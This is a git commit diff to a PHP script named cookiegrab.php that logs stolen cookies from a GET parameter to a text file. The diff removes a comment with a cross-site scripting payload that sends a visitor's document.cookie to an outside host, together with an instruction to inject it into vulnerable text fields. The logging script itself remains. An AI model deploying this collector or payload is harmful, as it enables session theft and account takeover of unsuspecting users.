788e5609fcdaceabfad29bc84d590055cf567384
DoggoBot CDN <72230902+doggobot-owner@users.noreply.github.com>
2021-04-16 19:46:33 +0300

    Update cookiegrab.php

--- cookiegrab.php
+++ cookiegrab.php
@@ -3,9 +3,4 @@
 	$cookie = $_GET[" c"];
 	$file = fopen('cookielog.txt', 'a');
 	fwrite($file, $cookie . "\n\n");
-	/* 
-	inject 
-	<script language="javascript"> document.location= " http://kennethzhang.net/cookiegrab.php?c=" + document.cookie; </script>
-	into vulnerable text fields
-	*/
-?> 
+?>
